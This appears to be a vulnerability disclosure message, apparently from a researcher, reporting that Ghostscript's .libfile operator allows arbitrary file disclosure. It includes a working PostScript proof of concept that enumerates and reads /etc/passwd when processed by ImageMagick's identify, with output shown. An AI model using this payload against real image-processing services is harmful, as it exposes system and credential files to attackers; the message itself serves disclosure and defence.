Maybe I'm missing something, because .libfile also works, this seems like free arbitrary file disclosure?  Here is the code I'm testing with (Note: I really don't know much postscript - and I hate it).  $ cat test.ps /dumpname {     dup             % copy filename     dup             % copy filename     print           % print filename     (\n) print      % print newline     status          % stat filename     {         (stat succeeded\n) print         ( ctime:) print         64 string cvs print         ( atime:) print         64 string cvs print         ( size:) print         64 string cvs print         ( blocks:) print         64 string cvs print         (\n) print         (\n) print     }{         (unable to stat\n\n) print     } ifelse     .libfile        % open as library     {         (.libfile returned file\n\n) print         64 string readstring         pop         % discard result (should proably test)         print         (\n) print     }{         (.libfile returned string\n) print         print         (\n) print     } ifelse } def  (/etc/pass*) /dumpname load string filenameforall  $ identify test.ps /etc/passwd stat succeeded  blocks:8  .libfile returned file  root:x:0:0:root:/root:/bin/bash  It seems obvious you can manipulate the output based on this. I'd be interested to hear why I'm wrong about this.  Tavis.
